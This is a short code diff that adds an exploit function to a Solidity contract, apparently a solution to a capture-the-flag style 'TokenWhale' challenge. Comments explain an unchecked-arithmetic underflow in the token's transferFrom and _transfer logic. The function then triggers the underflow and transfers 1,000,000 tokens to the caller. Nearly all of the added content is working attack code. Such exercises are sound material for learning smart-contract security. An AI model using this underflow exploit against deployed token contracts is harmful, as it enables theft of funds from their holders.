@@ -70,4 +70,15 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    // transfer from checks checks all balances and amounts appropriately but does not check the to and from address for equivelence
+    // then _transfer is directly called which does not check any balances or amounts
+    // instead it deducts from the msg.sender (as distinct from the `from` address) and adds to the `to` address
+    // these are uncheckeed operations so if msg.sender balance is 0 it underflows to a very large amount
+    // once the balance is underflowed to a large number we can transfer directly since the msg.sender balance check will pass
+    function exploit() public {
+        tokenWhale.transferFrom(msg.sender, msg.sender, 1000);
+        // at this point address(this) balance has underflowed and is now 2**256 - 1000
+        // so we can transfer 1_000_000 tokens to player directly
+        tokenWhale.transfer(msg.sender, 1_000_000);
+    }
 }
